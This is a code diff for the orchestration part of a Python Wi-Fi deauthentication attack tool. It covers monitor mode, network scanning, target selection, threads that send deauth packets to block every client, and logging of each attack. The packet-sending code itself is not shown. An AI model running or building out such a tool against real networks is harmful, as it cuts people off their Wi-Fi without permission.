@@ -127,34 +127,33 @@ class DeauthAttacker:
             self.running = True
             self.start_time = time.time()
 
-            # Create attack thread
-            attack_thread = Thread(target=self._send_deauth,
-                                args=(self.target_bssid, self.target_client))
-            attack_thread.daemon = True
-            attack_thread.start()
+            # Start client monitoring thread
+            monitor_thread = threading.Thread(target=self.monitor_clients)
+            monitor_thread.daemon = True
+            monitor_thread.start()
+            
+            # Start status display thread
+            self.status_thread = threading.Thread(target=self.display_status)
+            self.status_thread.daemon = True
+            self.status_thread.start()
 
-            # Display progress
-            with Progress() as progress:
-                task = progress.add_task(
-                    f"[cyan]Attacking {self.target_essid or self.target_bssid}...",
-                    total=None
-                )
+            # Start sending deauth packets
+            self.send_deauth_packets()
 
-                try:
-                    while self.running:
-                        progress.update(
-                            task,
-                            description=f"[cyan]Attacking {self.target_essid or self.target_bssid} "
-                                      f"(Packets: {self.packets_sent})[/cyan]"
-                        )
-                        time.sleep(1)
-                except KeyboardInterrupt:
-                    self.running = False
-
-            # Log activity
+        except KeyboardInterrupt:
+            self.console.print("\n[yellow]Attack stopped by user[/yellow]")
+        except Exception as e:
+            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
+        finally:
+            # Cleanup
+            self.running = False
+            if self.status_thread and self.status_thread.is_alive():
+                self.status_thread.join()
+            
+            # Log attack details
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             log_path = get_data_path('deauth', f'deauth_{timestamp}.txt')
-
+            
             with open(log_path, 'w') as f:
                 f.write(f"Deauthentication Attack Log\n")
                 f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
@@ -164,18 +163,10 @@ class DeauthAttacker:
                 f.write(f"Target Client: {self.target_client}\n")
                 f.write(f"Packets Sent: {self.packets_sent}\n")
                 f.write(f"Duration: {int(time.time() - self.start_time)} seconds\n")
+                f.write(f"Unique Clients Targeted: {len(self.clients)}\n")
 
             self.console.print(f"\n[green]Attack log saved to: {log_path}[/green]")
             log_activity(f"Deauth attack completed - Target: {self.target_essid or self.target_bssid}")
-
-        except Exception as e:
-            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
-
-        finally:
-            # Cleanup
-            self.running = False
-            # Let InterfaceManager handle mode switching
-            InterfaceManager.restore_managed_mode()
 
     def send_deauth_packets(self):
         """Send deauthentication packets with improved reliability and continuous blocking"""
@@ -329,68 +320,4 @@ class DeauthAttacker:
                     return self.clients[choice - 1]
             except ValueError:
                 pass
-            self.console.print("[red]Invalid choice. Please try again.[/red]")
-
-    def start_attack(self):
-        """Start deauthentication attack with improved client blocking"""
-        try:
-            # Get interface
-            self.interface = get_interface()
-            if not self.interface:
-                return
-
-            # Setup monitor mode
-            self.interface = setup_monitor_mode(self.interface)
-            if not self.interface:
-                return
-
-            # Scan for networks
-            self.console.print("\n[cyan]Scanning for networks...[/cyan]")
-            networks = scan_networks(self.interface)
-            
-            # Select target
-            result = select_target(networks)
-            if not result:
-                return
-                
-            self.target_bssid, self.target_channel, self.target_essid, self.clients = result
-            
-            # Start attack
-            self.console.print("\n[green]Starting aggressive deauthentication attack...[/green]")
-            self.console.print("[yellow]All devices will be prevented from connecting[/yellow]")
-            self.console.print("[yellow]Press Ctrl+C to stop[/yellow]\n")
-            
-            self.running = True
-            self.start_time = time.time()
-            
-            # Start client monitoring thread
-            monitor_thread = threading.Thread(target=self.monitor_clients)
-            monitor_thread.daemon = True
-            monitor_thread.start()
-            
-            # Start status display thread
-            self.status_thread = threading.Thread(target=self.display_status)
-            self.status_thread.daemon = True
-            self.status_thread.start()
-
-            # Start sending deauth packets
-            self.send_deauth_packets()
-
-        except KeyboardInterrupt:
-            self.console.print("\n[yellow]Attack stopped by user[/yellow]")
-        except Exception as e:
-            self.console.print(f"[red]Error during attack: {str(e)}[/red]")
-        finally:
-            self.running = False
-            if self.status_thread and self.status_thread.is_alive():
-                self.status_thread.join()
-            
-            # Log attack details
-            log_file = get_data_path('deauth', f'deauth_{self.target_bssid.replace(":", "")}.log')
-            with open(log_file, 'a') as f:
-                f.write(f"Attack completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"Target Network: {self.target_essid}\n")
-                f.write(f"Target BSSID: {self.target_bssid}\n")
-                f.write(f"Total Packets Sent: {self.packets_sent}\n")
-                f.write(f"Unique Clients Targeted: {len(self.clients)}\n")
-                f.write("-" * 50 + "\n") 
+            self.console.print("[red]Invalid choice. Please try again.[/red]") 
